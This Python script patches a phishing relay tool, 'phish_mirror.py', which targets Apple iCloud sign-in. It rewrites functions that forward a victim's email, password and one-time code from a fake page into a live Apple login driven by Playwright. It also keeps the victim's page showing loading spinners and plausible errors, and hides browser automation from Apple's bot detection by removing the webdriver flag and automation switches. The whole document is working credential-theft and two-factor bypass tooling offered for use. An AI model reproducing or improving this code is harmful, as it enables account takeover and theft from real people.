#!/usr/bin/env python3
"""Apply Apple drive + remote calm fixes after apply_mirror_patch overwrites phish_mirror."""
from __future__ import annotations

from pathlib import Path

MIRROR = Path(__file__).with_name("phish_mirror.py")

FORWARD_EMAIL_NEW = '''def forward_email(apple: Page, frame, email: str) -> bool:
    from apple_drive import drive_email

    frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
    if not frame:
        print('  [fwd] email: no apple frame; re-opening sign-in', flush=True)
        frame = open_icloud_sign_in(apple)
        if not frame:
            return False
    try:
        ok, _frame = drive_email(
            apple, frame, email, find_apple_frame, open_icloud_sign_in
        )
        return ok
    except PlaywrightError as e:
        print('  [fwd] email ERR', repr(e), flush=True)
        return False


'''

APPLE_AUTH_FRAME_NEW = '''def apple_auth_frame(page: Page):
    """Prefer the frame that actually shows the account field (avoids stale idmsa iframes)."""
    for frame in page.frames:
        try:
            loc = frame.locator('#account_name_text_field').first
            if loc.count() > 0 and loc.is_visible(timeout=500):
                return frame
        except PlaywrightError:
            pass
    for frame in page.frames:
        u = frame.url or ''
        if 'idmsa.apple.com' in u or 'appleid.apple.com' in u:
            return frame
        try:
            if frame.locator('#account_name_text_field').count() > 0:
                return frame
        except PlaywrightError:
            pass
    url = page.url or ''
    if 'idmsa.apple.com' in url or 'appleid.apple.com' in url:
        return page.main_frame
    try:
        if page.locator('#account_name_text_field').count() > 0:
            return page.main_frame
    except PlaywrightError:
        pass
    return None


'''

FORWARD_PASSWORD_NEW = '''def forward_password(apple: Page, frame, password: str, email: str = '') -> bool:
    from apple_drive import drive_password

    frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
    if not frame:
        print('  [fwd] password: no apple frame; re-opening sign-in', flush=True)
        frame = open_icloud_sign_in(apple)
        if not frame:
            return False
    try:
        ok, _frame = drive_password(
            apple,
            frame,
            password,
            email or '',
            find_apple_frame,
            password_submit_ok=_apple_password_submit_ok,
            open_signin=open_icloud_sign_in,
        )
        return ok
    except PlaywrightError as e:
        print('  [fwd] password ERR', repr(e), flush=True)
        return False


'''

APPLE_PW_READY_NEW = '''def apple_password_step_ready(frame) -> bool:
    if not frame:
        return False
    try:
        from apple_drive import password_entry_ready, read_account_email

        return password_entry_ready(frame, read_account_email(frame))
    except ImportError:
        pass
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const p = document.getElementById('password_text_field');
                  const a = document.getElementById('account_name_text_field');
                  const passwordVisible = !!(
                    p &&
                    !p.disabled &&
                    p.getAttribute('aria-hidden') !== 'true' &&
                    p.offsetParent !== null
                  );
                  const accountVisible = !!(a && a.offsetParent !== null);
                  if (!passwordVisible) return false;
                  if (!accountVisible) return true;
                  const v = (a.value || '').trim();
                  return v.length > 0;
                }"""
            )
        )
    except PlaywrightError:
        return False


'''


def replace_function(text: str, name: str, new_body: str) -> str:
    marker = f"def {name}("
    start = text.find(marker)
    if start < 0:
        raise SystemExit(f"patch_apple_engine: missing {name}")
    nxt = text.find("\ndef ", start + len(marker))
    if nxt < 0:
        raise SystemExit(f"patch_apple_engine: cannot find end of {name}")
    return text[:start] + new_body + text[nxt + 1 :]


def patch_password_submit(text: str) -> str:
    if "victim submit -> forward_password" in text:
        return text
    drop = (
        "                            victim_begin_signin_loading(victim, remote=args.remote)\n"
        "                            victim_signin_loading_until = time.time() + 90.0\n"
        "                            apple_input_cache.pop('#password_text_field', None)\n"
    )
    if drop in text:
        text = text.replace(drop, "", 1)
    old_fwd = """                            push_victim_email_to_apple(
                                apple,
                                frame,
                                victim_email_state,
                                apple_email_live,
                                force=True,
                                sync_cache=apple_input_cache,
                            )
                            frame = find_apple_frame(apple, frame)
                            if em and _apple_account_email(frame).lower() != em.lower():
                                forward_email(apple, frame, em)
                                frame = find_apple_frame(apple, frame)
                            push_victim_password_to_apple(
                                apple,
                                frame,
                                victim_password_state,
                                apple_password_live,
                                force=True,
                            )
                            frame = find_apple_frame(apple, frame)
                            if forward_password(
                                apple,
                                frame,
                                pwd_send,
                                em or credentials.get('email') or account,
                            ):
                                frame = find_apple_frame(apple, frame)
                                pending_verify_until = time.time() + 35.0
                                mirror_loading_until = time.time() + 35.0
                                victim_signin_loading_until = 0.0
                                awaiting_apple_path = '/verify'
                                victim_set_verify(victim, credentials.get('email') or '')
                                if args.remote and hasattr(victim, 'push_harbor_state'):
                                    victim_clear_signin_loading(
                                        victim,
                                        remote=True,
                                        extra={'mirrorLoading': True},
                                    )
                                elif not args.remote:
                                    victim_eval(
                                        victim,
                                        \"\"\"() => {
                                          if (window.PhishBridge) window.PhishBridge.setLoading(false);
                                          if (window.HarborDriver) window.HarborDriver.setMirrorLoading(true);
                                        }\"\"\",
                                    )
                            else:
                                frame = find_apple_frame(apple, frame)
                                victim_signin_loading_until = 0.0
                                victim_clear_signin_loading(victim, remote=args.remote)
                                victim_eval(
                                    victim,
                                    \"\"\"() => {
                                      if (window.HarborDriver && window.HarborDriver.showSignInError) {
                                        window.HarborDriver.showSignInError(
                                          'Password could not be sent to Apple. Complete email on iCloud first, then try again.',
                                          'password'
                                        );
                                      }
                                    }\"\"\",
                                )"""
    new_fwd = """                            print(
                                f'  [fwd] victim submit -> forward_password ({len(pwd_send)} chars)',
                                flush=True,
                            )
                            frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
                            pwd_ok = False
                            try:
                                pwd_ok = forward_password(
                                    apple,
                                    frame,
                                    pwd_send,
                                    em or credentials.get('email') or account,
                                )
                            finally:
                                victim_signin_loading_until = 0.0
                                victim_clear_signin_loading(victim, remote=args.remote)
                            if pwd_ok:
                                frame = find_apple_frame(apple, frame)
                                pending_verify_until = time.time() + 35.0
                                mirror_loading_until = time.time() + 35.0
                                awaiting_apple_path = '/verify'
                                victim_set_verify(victim, credentials.get('email') or '')
                                if args.remote and hasattr(victim, 'push_harbor_state'):
                                    victim.push_harbor_state(
                                        {'mirrorLoading': True, 'clearSigninLoading': True}
                                    )
                                elif not args.remote:
                                    victim_eval(
                                        victim,
                                        \"\"\"() => {
                                          if (window.PhishBridge) window.PhishBridge.setLoading(false);
                                          if (window.HarborDriver) window.HarborDriver.setMirrorLoading(true);
                                        }\"\"\",
                                    )
                            else:
                                victim_push_signin_error(
                                    victim,
                                    'Could not send password to Apple. Check the iCloud window, then try again.',
                                    'password',
                                    remote=args.remote,
                                )"""
    if old_fwd in text:
        text = text.replace(old_fwd, new_fwd, 1)
    old_clear = "    payload: dict = {'clearSigninLoading': True}\n"
    new_clear = "    payload: dict = {'clearSigninLoading': True, 'signinLoading': False}\n"
    if old_clear in text and new_clear not in text:
        text = text.replace(old_clear, new_clear, 1)
    old_push_pw = """    _apple_force_password_field(frame, value)
    live_sync.mark_pushed(value)"""
    new_push_pw = """    try:
        from apple_drive import password_entry_ready, read_account_email, type_password

        em = read_account_email(frame)
        if not password_entry_ready(frame, em):
            return
        type_password(frame, value or '')
    except ImportError:
        _apple_force_password_field(frame, value)
    live_sync.mark_pushed(value)"""
    if old_push_pw in text and "type_password(frame, value" not in text:
        text = text.replace(old_push_pw, new_push_pw, 1)
    return text


def patch_remote_calm(text: str) -> str:
    old_push = """                push_victim_email_to_apple(
                    apple, frame, victim_email_state, apple_email_live,
                    sync_cache=apple_input_cache,
                )
                push_victim_password_to_apple(
                    apple, frame, victim_password_state, apple_password_live
                )"""
    new_push = """                if not args.remote:
                    push_victim_email_to_apple(
                        apple, frame, victim_email_state, apple_email_live,
                        sync_cache=apple_input_cache,
                    )
                    push_victim_password_to_apple(
                        apple, frame, victim_password_state, apple_password_live
                    )"""
    if old_push in text and "if not args.remote:" not in text.split(old_push)[0][-200:]:
        text = text.replace(old_push, new_push, 1)

    old_tick = """                        frame = find_apple_frame(apple, frame)

                tick_pending_email_forward()

                # 2) Keep Apple OTP in sync with victim /verify, submit when complete."""
    new_tick = """                        frame = find_apple_frame(apple, frame)

                # 2) Keep Apple OTP in sync with victim /verify, submit when complete."""
    if old_tick in text:
        text = text.replace(old_tick, new_tick, 1)

    old_end = """                tick_pending_email_forward()
                time.sleep(max(args.poll_ms, 50) / 1000.0)"""
    new_end = """                if pending_email_account and not args.remote:
                    tick_pending_email_forward()
                time.sleep(max(args.poll_ms, 50) / 1000.0)"""
    if old_end in text and "pending_email_account and not args.remote" not in text:
        text = text.replace(old_end, new_end, 1)

    old_ui = """                    elif time.time() < victim_signin_loading_until:
                        ui_state['signinLoading'] = True
                    if route_sync.operator_path() == '/verify'"""
    new_ui = """                    elif time.time() < victim_signin_loading_until:
                        ui_state['signinLoading'] = True
                    else:
                        ui_state['clearSigninLoading'] = True
                        ui_state['signinLoading'] = False
                    if route_sync.operator_path() == '/verify'"""
    if old_ui in text and "else:\n                        ui_state['clearSigninLoading']" not in text:
        text = text.replace(old_ui, new_ui, 1)

    old_pw_commit = """                            push_victim_password_to_apple(
                                apple,
                                frame,
                                victim_password_state,
                                apple_password_live,
                                force=True,
                            )
                            frame = find_apple_frame(apple, frame)
                        continue"""
    new_pw_commit = """                        continue"""
    if old_pw_commit in text:
        text = text.replace(old_pw_commit, new_pw_commit, 1)

    old_spin = """                    elif time.time() < victim_signin_loading_until:
                        ui_state['signinLoading'] = True
                    else:
                        ui_state['clearSigninLoading'] = True
                        ui_state['signinLoading'] = False
                    if route_sync.operator_path() == '/verify'"""
    new_spin = """                    elif (
                        time.time() < victim_signin_loading_until
                        and not (on_signin and pw_on_apple and victim_password_ui_applied)
                    ):
                        ui_state['signinLoading'] = True
                    else:
                        ui_state['clearSigninLoading'] = True
                        ui_state['signinLoading'] = False
                    if route_sync.operator_path() == '/verify'"""
    if (
        "on_signin and pw_on_apple and victim_password_ui_applied" not in text
        and old_spin in text
    ):
        text = text.replace(old_spin, new_spin, 1)

    return text


def patch_stealth_launch(text: str) -> str:
    needle = "    launch_opts: dict = {'headless': bool(args.headless)}\n    if args.channel:\n        launch_opts['channel'] = args.channel\n"
    insert = (
        needle
        + "    launch_opts.setdefault('args', [])\n"
        + "    if '--disable-blink-features=AutomationControlled' not in launch_opts['args']:\n"
        + "        launch_opts['args'].append('--disable-blink-features=AutomationControlled')\n"
        + "    launch_opts['ignore_default_args'] = ['--enable-automation']\n"
    )
    if "ignore_default_args" not in text and needle in text:
        text = text.replace(needle, insert, 1)

    old_ctx = "        mirror_context = browser.new_context(viewport={'width': 1000, 'height': 940})\n        apple = mirror_context.new_page()"
    new_ctx = (
        "        mirror_context = browser.new_context(viewport={'width': 1000, 'height': 940})\n"
        "        mirror_context.add_init_script(\n"
        "            \"Object.defineProperty(navigator, 'webdriver', {get: () => undefined});\"\n"
        "        )\n"
        "        apple = mirror_context.new_page()"
    )
    if old_ctx in text and "webdriver" not in text.split(old_ctx)[0][-300:]:
        text = text.replace(old_ctx, new_ctx, 1)
    return text


def main() -> None:
    text = MIRROR.read_text(encoding="utf-8")
    text = replace_function(text, "forward_email", FORWARD_EMAIL_NEW)
    if "def forward_password(apple: Page, frame, password: str" in text:
        text = replace_function(text, "forward_password", FORWARD_PASSWORD_NEW)
    text = replace_function(text, "apple_auth_frame", APPLE_AUTH_FRAME_NEW)
    text = replace_function(text, "apple_password_step_ready", APPLE_PW_READY_NEW)
    text = patch_remote_calm(text)
    text = patch_password_submit(text)
    text = patch_stealth_launch(text)
    if "from apple_drive import drive_email" not in text:
        raise SystemExit("forward_email patch failed")
    MIRROR.write_text(text, encoding="utf-8")
    print("OK patch_apple_engine", MIRROR.stat().st_size)


if __name__ == "__main__":
    main()
